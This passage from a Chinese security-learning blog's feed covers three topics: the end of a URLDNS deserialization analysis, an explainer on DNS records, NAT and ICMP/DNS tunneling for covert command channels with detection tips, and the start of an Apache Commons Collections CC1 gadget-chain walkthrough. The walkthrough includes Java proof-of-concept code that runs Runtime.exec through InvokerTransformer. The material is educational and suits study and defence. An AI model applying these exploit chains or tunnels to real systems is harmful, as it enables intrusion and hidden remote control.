title="查地址：触发DNS请求（核心利用）"></a><strong>查地址：触发DNS请求（核心利用）</strong></h3><p><strong>URL的陷阱逻辑</strong></p><p>URL的<code>hashCode</code>发现自己的<code>hashCode</code>是-1（反射改回的初始值），于是调用<code>URLStreamHandler.hashCode()</code></p><p>这个方法内部会解析URL的主机名（如<code>xxx.dnslog.cn</code>），调用<code>InetAddress.getByName()</code>发起DNS查询</p><p><strong>结果反馈</strong>：DNS查询记录会被攻击者的监控平台（如DNSLog）捕获，证明目标存在反序列化漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;URLDNS-链子分析&quot;&gt;&lt;a href=&quot;#URLDNS-链子分析&quot; class=&quot;headerlink&quot; title=&quot;URLDNS 链子分析&quot;&gt;&lt;/a&gt;URLDNS 链子分析&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>内网穿透初探</title>
    <link href="https://gu0f3n.github.io/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/"/>
    <id>https://gu0f3n.github.io/2025/03/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%88%9D%E6%8E%A2/</id>
    <published>2025-03-21T05:07:31.000Z</published>
    <updated>2025-03-21T12:27:21.468Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下网络知识</p><p>主要学习下DNS,因为在后续的内网渗透与应急感觉用的会比较多</p><p>DNS解析流程有个大致的了解 这里就不一一细谈了主要还是学习一下域名解析记录</p><h2 id="域名解析记录"><a href="#域名解析记录" class="headerlink" title="域名解析记录"></a>域名解析记录</h2><h3 id="A记录（快递地址簿）"><a href="#A记录（快递地址簿）" class="headerlink" title="A记录（快递地址簿）****"></a><strong>A记录</strong>（快递地址簿）****</h3><p>代表Address，用来指定域名对应的IP地址，如将item.taobao.com指定到115.238.23.xxx，将switch.taobao.com指定到121.14.24.xxx。<strong>A****记录可以将多个域名解析到一个IP地址，但是不能将一个域名解析到多个IP地址</strong></p><p><em>例子</em>：<code>item.taobao.com</code>指向<code>115.238.23.xxx</code>，相当于告诉快递员“淘宝商品页的快递送到这个地址”</p><p><strong>特点</strong>：</p><ul><li>一个域名只能对应一个IP，但多个域名可以指向同一个IP（比如淘宝的多个子页面共用服务器）</li><li>如果服务器搬家（换IP），得手动改地址簿</li></ul><h3 id="MX记录（邮局分拣员）"><a href="#MX记录（邮局分拣员）" class="headerlink" title="MX记录（邮局分拣员）"></a><strong>MX记录（邮局分拣员）</strong></h3><p>Mail Exchange，就是可以将某个域名下的邮件服务器指向自己的Mail Server，如taobao.com域名的A记录IP地址是115.238.25.xxx，如果将MX记录设置为115.238.25.xxx，即<a href="mailto:&#x78;&#120;&#120;&#64;&#116;&#x61;&#111;&#x62;&#97;&#111;&#46;&#99;&#x6f;&#109;">&#x78;&#120;&#120;&#64;&#116;&#x61;&#111;&#x62;&#97;&#111;&#46;&#99;&#x6f;&#109;</a>的邮件路由，DNS会将邮件发送到115.238.25.xxx所在的服务器，而正常通过Web请求的话仍然解析到A记录的IP地址<br><strong>功能</strong>：专门管邮件的“快递路线”。告诉别人发到你这个域名的邮件该送到哪个邮局（邮件服务器）。<em>例子</em>：<code>xxx@taobao.com</code>的邮件会被送到<code>115.238.25.xxx</code>的服务器，而网页访问还是走A记录的地址</p><p><strong>特点</strong>：</p><ul><li>可以设多个邮局，优先级数字小的先送（比如优先级5的服务器优先于10的）</li><li>邮件服务器坏了，备用的会自动顶上</li></ul><h3 id="CNAME记录（连锁店别名）"><a href="#CNAME记录（连锁店别名）" class="headerlink" title="CNAME记录（连锁店别名）"></a><strong>CNAME记录（连锁店别名）</strong></h3><p>Canonical Name，即别名解析。所谓别名解析就是可以为一个域名设置一个或者多个别名，如将aaa.com解析到bbb.net、将ccc.com也解析到bbb.net，其中bbb.net分别是aaa.com和ccc.com的别名</p><p><strong>功能</strong>：给域名起外号，多个名字指向同一个地方</p><p><em>例子</em>：<code>aaa.com</code>和<code>ccc.com</code>都指向<code>bbb.net</code>，就像“肯德基”和“KFC”是同一家店</p><p><strong>特点</strong></p><p>换服务器地址时，只用改主域名（比如<code>bbb.net</code>的IP），所有别名自动更新，不用一个个改</p><p>必须带前缀（比如<code>www.taobao.com</code>不能直接叫<code>taobao.com</code>，得用A记录</p><h3 id="NS记录（快递公司总部）"><a href="#NS记录（快递公司总部）" class="headerlink" title="NS记录（快递公司总部）"></a><strong>NS记录（快递公司总部）</strong></h3><p>为某个域名指定DNS解析服务器，也就是这个域名由指定的IP地址的DNS服务器取解析</p><p><strong>功能</strong>：指定谁负责你家域名的“快递分拣”（DNS解析）。<br><em>例子</em>：如果你用腾讯云的DNS服务，NS记录会写成<code>ns1.dnspod.com</code>，相当于把快递分拣工作外包给腾讯</p><p><strong>特点</strong></p><p>一个域名可以有多个分拣中心（比如主备DNS服务器）</p><p>改NS记录后，全球生效需要24-48小时（因为各地快递公司更新地址簿要时间）</p><h3 id="TXT记录（店铺留言板）"><a href="#TXT记录（店铺留言板）" class="headerlink" title="TXT记录（店铺留言板）"></a><strong>TXT记录（店铺留言板）</strong></h3><p>为某个主机名或域名设置说明，如可以为ddd.net设置TXT记录为”这是XXX的博客”这样的说明</p><p><strong>功能</strong>：给域名贴个“备注标签”，用来验证身份或防垃圾邮件</p><p><em>例子</em>：</p><p>验证域名所有权：加一条TXT记录<code>google-site-verification=xxxxx</code>，证明你是网站主人</p><p>防垃圾邮件：设置SPF记录<code>v=spf1 include:aliyun.com ~all</code>，告诉别人“只有阿里云的服务器能代表我发邮件</p><p><strong>特点</strong></p><p>内容随便写，但格式要对（比如SPF记录必须以<code>v=spf1</code>开头）</p><p>简单学习了这个协议的基础知识之后就准备学习内网穿透的知识</p><h1 id="内网渗透系列：内网穿透（隧道）学习"><a href="#内网渗透系列：内网穿透（隧道）学习" class="headerlink" title="内网渗透系列：内网穿透（隧道）学习"></a>内网渗透系列：内网穿透（隧道）学习</h1><h2 id="内网穿透概述"><a href="#内网穿透概述" class="headerlink" title="内网穿透概述"></a>内网穿透概述</h2><h5 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h5><p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络</p><p><em>内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。</em></p><p>简单来说内网穿透的目的是：让外网能访问你本地的应用，例如在外网打开你本地<a href="http://127.0.0.1指向的web站点.举例子我的世界你想要进行局域网联机同时要和你远在天边的朋友进行游玩那么盆友就可以利用内网穿透来达成与你玩的目的/">http://127.0.0.1指向的Web站点。举例子我的世界你想要进行局域网联机同时要和你远在天边的朋友进行游玩那么盆友就可以利用内网穿透来达成与你玩的目的</a></p><p>这里简单了解下NAT协议</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**NAT 协议（Network Address Translation）** 的应用场景如同它的名称——网络地址转换，应用于内部网到外部网的地址转换过程中。</span><br><span class="line"></span><br><span class="line">**核心功能**：把内网设备的“私有门牌号”（私有IP）转换成外网的“公共门牌号”（公网IP），方便内外网通信</span><br><span class="line"></span><br><span class="line">*例子*：你家在小区3号楼（内网IP `192.168.1.5`），但快递单上只能写小区大门地址（公网IP `219.155.6.240`），门卫（NAT设备）负责把快递送到你家</span><br><span class="line"></span><br><span class="line">**为什么需要NAT？****</span><br><span class="line"></span><br><span class="line">**根本原因**：全球公网IP不够用（类似门牌号不够），而小区（内网）可以无限复制私有门牌号</span><br></pre></td></tr></table></figure><p>那么想要实现内网穿透就得进行一个搭建桥梁</p><h3 id="常见实现方式（怎么搭桥？）"><a href="#常见实现方式（怎么搭桥？）" class="headerlink" title="常见实现方式（怎么搭桥？）****"></a><strong>常见实现方式</strong>（怎么搭桥？）****</h3><p>端口映射 反向代理，vpn隧道，NAT进行穿透</p><p>端口映射就是把内网的ip都映射到一个公网的端口上面所有的流量就会从公网ip端口进入到你的内网ip</p><p>反向代理 就比如说我们租一个云服务器，别人对云服务的公网ip进行访问，服务器会把别人访问的流量转接到我们内网的设备</p><p><strong>例子</strong>：用frp工具把内网摄像头画面通过云服务器暴露给外网</p><p>vpn就是开一条新的隧道 直接到公网不会经过运营商</p><p>内网穿透（NAT穿透）蒋NAT设备记录用来把内部网络的私有IP地址映射到外部网络的合法IP地址上去</p><p>搞清楚内网穿透的基本原理</p><p>终于到隧道技术了</p><h1 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a><strong>隧道技术</strong></h1><p>一种通过使用互联网络的基础设施在网络之间传递数据的方式，包括数据封装、传输和解包在内的全过程。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。</p><p>用大白话解释<strong>隧道技术</strong>，可以想象成<strong>给数据包穿马甲过安检</strong>的过程</p><p>整个过程就像快递员要把违禁品送过安检，必须套个合法的包装，过了检查再拆开还原。具体分三步走</p><h3 id="第一步：穿马甲（封装）"><a href="#第一步：穿马甲（封装）" class="headerlink" title="第一步：穿马甲（封装）"></a><strong>第一步：穿马甲（封装）</strong></h3><p><strong>伪装需求</strong>：比如你想从公司内网传文件到家里，但公司防火墙只允许HTTP流量通过（其他协议全被拦截）</p><p><strong>套外壳</strong>：隧道技术会把你的文件数据（比如SSH协议）塞进HTTP协议的“快递箱”里，并贴上新标签（如目标地址、端口）</p><p><em>就像把私密信件塞进月饼盒，外面写上“节日礼品”蒙混过关。</em></p><h3 id="第二步：过安检（传输）"><a href="#第二步：过安检（传输）" class="headerlink" title="第二步：过安检（传输）"></a><strong>第二步：过安检（传输）</strong></h3><p><strong>走公共通道</strong>：伪装后的数据包通过公共网络（比如互联网）传输，防火墙看到的是合法的HTTP流量，直接放行<em>比如用微信发文件，实际走的是微信的服务器通道，而不是直连对方电脑。</em></p><p><strong>路由中转</strong>：数据包可能经过多个路由器跳转，但全程保持“马甲”不脱落<em>类似快递从北京发广州，中间经过郑州、长沙中转站，但月饼盒始终完好</em></p><h3 id="第三步：拆包裹（解包）"><a href="#第三步：拆包裹（解包）" class="headerlink" title="第三步：拆包裹（解包）"></a><strong>第三步：拆包裹（解包）</strong></h3><p><strong>目的地验收</strong>：数据包到达目标服务器后，隧道端点（如家里的VPN服务器）会拆掉HTTP的“马甲”，还原出原始数据（SSH协议文件）</p><p><em>就像收到月饼盒后拆开，取出里面的私密信件</em><strong>精准投递</strong>：解包后的数据按原始协议送到最终设备（如你的家用电脑）</p><p>按所处的协议层分层：</p><ul><li>网络层隧道：ICMP隧道等</li><li>传输层隧道：TCP隧道、UDP隧道</li><li>应用层隧道：HTTP、DNS、SSH等隧道</li></ul><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250321142723.png"></p><p>那么内网里面除了刚才了解到的http协议可以通过防火墙进行出网还有哪些协议呢</p><h3 id="内网主机所有可能的出网方式"><a href="#内网主机所有可能的出网方式" class="headerlink" title="内网主机所有可能的出网方式"></a>内网主机所有可能的出网方式</h3><h5 id="允许ICMP协议出网"><a href="#允许ICMP协议出网" class="headerlink" title="允许ICMP协议出网"></a>允许ICMP协议出网</h5><h2 id="ICMP隧道原理"><a href="#ICMP隧道原理" class="headerlink" title="ICMP隧道原理"></a>ICMP隧道原理</h2><p>首先了解下ICMP这个协议</p><p>ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p><p>简单来说就是一个检查网络可不可达的协议</p><p>原理</p><p>由于ICMP报文自身可以携带数据，而且ICMP报文是由系统内核处理的，不占用任何端口，因此具有很高的隐蔽性。</p><p>通常ICMP隧道技术采用ICMP的ICMP_ECHO和ICMP_ECHOREPLY两种报文，把数据隐藏在ICMP数据包包头的选项域中，利用ping命令建立隐蔽通道。</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/6a123b327b673db81ffb5ffb471e2cc.png"></p><p>进行隐蔽传输的时候，肉鸡(防火墙内部)运行并接受外部攻击端的ICMP_ECHO数据包，攻击端把需要执行的命令隐藏在ICMP_ECHO数据包中，肉鸡接收到该数据包，解出其中隐藏的命令，并在防火墙内部主机上执行，再把执行结果隐藏在ICMP_ECHOREPLY数据包中，发送给外部攻击端。</p><p>比如：攻击者把指令<code>whoami</code>藏在数据区，发到内网机器，内网机器执行<code>whoami</code>后，把结果藏在回应的ICMP包里发回去</p><h3 id="ICMP隧道能干啥？"><a href="#ICMP隧道能干啥？" class="headerlink" title="ICMP隧道能干啥？"></a><strong>ICMP隧道能干啥？</strong></h3><p><strong>绕过防火墙</strong>：</p><p>内网机器被限制只能<code>ping</code>外网，但通过ICMP隧道可以偷偷传文件或远程控制</p><ul><li><em>例子：公司内网禁止SSH，但允许<code>ping</code>，员工用ICMP隧道传敏感文件。</em></li></ul><p><strong>反弹Shell</strong></p><p>攻击者通过ICMP包向受害机器发送指令，受害机器执行后通过ICMP包返回结果，实现远程控制</p><p><strong>内网穿透</strong></p><p>内网主机通过ICMP隧道将流量转发到公网代理，实现访问外网资源（类似早年免费上网的“黑科技”）</p><h3 id="三、ICMP隧道的优缺点"><a href="#三、ICMP隧道的优缺点" class="headerlink" title="三、ICMP隧道的优缺点"></a><strong>三、ICMP隧道的优缺点</strong></h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a><strong>优点</strong></h4><p><strong>隐蔽性强</strong>：数据藏在<code>ping</code>包里，防火墙一般不管</p><p><strong>无需端口</strong>：直接利用系统内核处理ICMP协议，不依赖特定端口</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a><strong>缺点</strong></h4><p><strong>速度慢</strong>：ICMP包默认数据量小（Windows 32字节、Linux 48字节），大文件传输像蚂蚁搬家</p><p><strong>不稳定</strong>：ICMP是无连接协议，容易丢包，适合传小指令，不适合高清视频</p><p><strong>权限要求高</strong>：修改ICMP数据需要管理员权限（普通用户玩不转）</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><ul><li><p>检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP隧道的浏览器在同一时间会产生上千个 ICMP 数据包。</p></li><li><p>寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。</p></li><li><p>注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64 比特，这样会使得更难以被检测到。</p></li><li><p>检查ICMP数据包的协议标签，例如icmptunnel 会在所有的 ICMPpayload 前面增加 ‘TUNL’ 标记以用于识别隧道，这就是特征。</p></li></ul><h1 id="允许特定的TCP或UDP协议端口出网"><a href="#允许特定的TCP或UDP协议端口出网" class="headerlink" title="允许特定的TCP或UDP协议端口出网"></a>允许特定的TCP或UDP协议端口出网</h1><p>络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。</p><p>在一个不能出网的网络环境里面，将所有的TCP和UPD端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致：</p><p>比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行<br>比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口</p><h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><h5 id="允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"><a href="#允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）" class="headerlink" title="允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"></a>允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）</h5><p>这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议</p><p>原理</p><p>端口不和服务绑定，可以传输任何数据。</p><p>详细聊聊这段文字 端口不和服务绑定是什么意思呢，意思就是DNS的53号端口它如果只能传递带有DNS头的数据包的流量这个就叫做端口和服务进行绑定但是DNS端口可以传输文件，指令甚至可以传输电影 这个意思就是端口和服务没有进行绑定 这就造成了我们对DNS隧道的一个利用</p><p>C&amp;C服务器在建立连接后将指令传递给客户端上的后门程序。</p><p>客户端后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果，如果互联网上有一台攻击者设置的服务器，那么服务器就可以依靠域名解析的响应进行数据包的交换，从DNS协议的角度来看，这样的操作只是反复查询某个或者某些特定的域名并且得到解析结果，但其本质是，DNS预期的返回结果应该是一个IP地址，而事实上返回的可以是任意字符串，包括加密的C&amp;C指令，从而将其他协议封装在DNS协议中进行传输。<br>DNS隧道（直联型）木马的通信结构如下：</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/c35866a915140c30a95b310e6f3fe54.png"></p><p>直连也就是客户端直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度更快，但是隐蔽性较差，容易被WAF或者IDS设备探测到，另外限制比较高，很多实际场景下不允许攻击者来自定义DNS Server，否则很容易被发现。</p><p>名中继型：</p><p>通过DNS递归查询实现的中继隧道，比较隐蔽，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多(其实就类似伪造一台私有DNS Server，当然也许大佬神仙们真有一台权威DNS Server也说不一定哈)，同时我们还需要规避本地客户端的DNS缓存，这里可以使用随机域名生成算法（DGA）。很多恶意软件利用该算法生成随机域名，有效绕过黑名单检测，通过轮询的方式尝试连接，寻找C2控制中心。（DGA算法的检测测方法也有不少，这里按下不表）<br><img src="C:\Users\GuoFen\AppData\Roaming\Typora\typora-user-images\image-20250321154330405.png" alt="image-20250321154330405"></p><p>①受到木马控制的PC将数据封装到DNS数据报文里，向位于内网的本地域名服务器请求查询baidu.com</p><p>②本地域名服务器透过防火墙向根域名服务器发送查询请求</p><p>③经过大量的递归重定向，查询请求发到baidu.com的（伪造）权威域名服务器</p><p>④baidu.com（伪造）权威域名服务器是在攻击者控制下，解析并发送响应包</p><p>⑤dns响应包穿透内网防火墙</p><p>⑥进入内网</p><p>⑦本地域名服务器将响应包返回给受控客户端检测：</p><p>缺点：</p><ul><li><strong>速度慢</strong>：DNS查询需要来回多次，传大文件会急死人。</li><li><strong>可能被检测</strong>：防火墙发现大量异常DNS请求会报警。</li><li><strong>需要自建NS服务器</strong>：得有个服务器随时待命处理查询。</li></ul><h3 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h3><ul><li>每个IP地址的DNS流量异常，DNS报文数量大</li><li>DNS消息中TXT或NULL等不常用的记录类型多</li><li>DNS消息中域名有部分固定不变</li><li>DNS服务器的地理位置异常</li><li>访问非受信的DNS服务器</li><li>基于请求域名长度及请求频率统计分析方法</li><li>dnscat 查询中包含了dnscat 字符串</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学习一下网络知识&lt;/p&gt;
&lt;p&gt;主要学习下DNS,因为在后续的内网渗透与应急感觉用的会比较多&lt;/p&gt;
&lt;p&gt;DNS解析流程有个大致的了解 这里就不一一细谈了主要还是学习一下域名解析记录&lt;/p&gt;
&lt;h2 id=&quot;域名解析记录&quot;&gt;&lt;a href=&quot;#域名解析记录&quot; class=</summary>
      
    
    
    
    <category term="network" scheme="https://gu0f3n.github.io/categories/network/"/>
    
    
    <category term="network" scheme="https://gu0f3n.github.io/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>cc1分析</title>
    <link href="https://gu0f3n.github.io/2025/03/19/cc1%E5%88%86%E6%9E%90/"/>
    <id>https://gu0f3n.github.io/2025/03/19/cc1%E5%88%86%E6%9E%90/</id>
    <published>2025-03-19T11:48:51.000Z</published>
    <updated>2025-03-20T10:13:17.967Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>环境搭建不说了 网上很多优秀的文章教学</p><p>先列出利用的链子然后我们需要倒着进行分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()--&gt;</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;</span><br><span class="line">TransformedMap.checkSetValue()--&gt;</span><br><span class="line">ChainedTransformer.transform()--&gt;</span><br><span class="line">InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p>CC1链的<strong>末尾</strong>（入口&#x2F;源头）就是Commons Collections库中的<code>Tranformer</code>接口，这个接口里面有个<code>transform</code>方法。</p><p><strong>InvokerTransformer</strong></p><p>找到这个类发现实现了Tranformer接口的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//定义了一个返回类型是object的公共方法且接受的参数是一个input的Object</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;<span class="comment">//检查传入的参数是否为null,为null直接返回null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//反射获取 input 对象的 Class 对象。</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//从 cls 表示的类中查找一个公共方法，并返回对应的 Method 对象。</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//调用 method 表示的方法，并返回其结果</span></span><br></pre></td></tr></table></figure><p>可以看到这段代码 代码不好建议逐句分析这里直接放到注释里面</p><p>这就完全符合反序列化的参数可控可以直接进行利用，参数可控就导致了<strong>反射调用任意类 任意方法</strong>。</p><p>进行利用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//正常 调用可命令执行的方法</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//使用反射 调用可命令执行的方法</span></span><br><span class="line">        <span class="comment">//Class clazz = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method cmdMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//cmdMethod.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//InvokerTransformer类 调用可命令执行的方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);<span class="comment">//给InvokerTransformer里的参数赋值，然后调用transform（cmd），最终实习在cmd上实现Runtime.getRuntime().exec(&quot;calc&quot;)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250319202058.png"></p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>知道了<code>InvokerTransformer</code>类可以调用<code>transform()</code>方法执行命令，那接下来的思路就是寻找还有其他什么地方调用了<code>InvokerTransformer</code>类的<code>transform()</code>方法。</p><p>可以看到在TransformedMap这个类下面的checkSetValue方法调用了从valueTransformer.transform</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320133956.png"></p><p>往上找valueTransformer </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现 keyTransformer，valueTransformer 参数可控 但是是protected，只能内部类访问，权限不够，往上找，查看是谁具体调用了方法checkSetValue()内部的这个transform()，发现是valueTransformer进行调用，查看valueTransformer，发现valueTransformer也是protect权限，继续查看valueTransformer从哪里来的，最后我们发现decorate()调用TransformedMap()的构造方法来的，所有涉及到的方法，只有decorate的权限修饰符是public</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这个decorate类我们就可以进一步控制valueTransformer</p><p>关键：<code>TransformedMap</code> 本身不存储数据，而是将操作委托给原始 <code>HashMap</code>，并在操作前后触发转换器逻辑。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里穿插一下TransformedMap装饰器本事就像是一个外挂没有实际作用需要HashMap来存储键值对，需要披挂在HashMap上才能发挥作用</span><br></pre></td></tr></table></figure><p>由于我们使用的是transformMap的方法，所以先去构建一个HashMap，再通过这个map来调用transformer内的decorate()来完成一个transformedMap的实例化，最后再想办法触发checkSetValue()方法即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r=Runtime.*getRuntime*();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line"> HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//这个直接实例化一个HashMap</span></span><br><span class="line"></span><br><span class="line"> Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer); </span><br><span class="line"><span class="comment">//静态方法staic修饰直接类名＋方法名调用</span></span><br><span class="line"><span class="comment">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span></span><br></pre></td></tr></table></figure><p><strong>寻找调用checkSetValue()的方法</strong></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320142341.png"></p><p>发现AbstractlnputCheckedMapDecorator类种的setValue方法可以进行对checkSetvalue的调用那么就</p><p><code>checkSetValue()</code>是<code>TransformedMap</code>的关键方法，用于在值被修改时应用转换逻辑。当调用 <code>Map.Entry.setValue()</code> 修改条目值时，<code>TransformedMap</code> 的 <code>checkSetValue()</code> 会被触发，对值进行转换。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">穿插：Map里存储了键值对,每一个键值对被java封装成一个Entry对象，当想修改键值对的值的时候就可以可以直接通过`Entry`的`setValue()`方法进行修改，这里因为有装饰器TransformedMap，装饰器TransformedMap监听对值的修改操作，就是每当想调用**`setValue()`时，外挂会先触发`checkSetValue()`方法**，对修改的值做额外的处理</span><br></pre></td></tr></table></figure><p>MapEntry类实际上是重写父类AbstractMapEntryDecorator的setValue()方法</p><p>MapEntry的父类AbstractMapEntryDecorator又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue()，，然后水到渠成的调用checkSetValue()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释下为什么要遍历：`TransformedMap`的机制**：它通过装饰`Map.Entry`对象（每个纸条）来监听修改操作，直接调用`map.put(&quot;键&quot;, 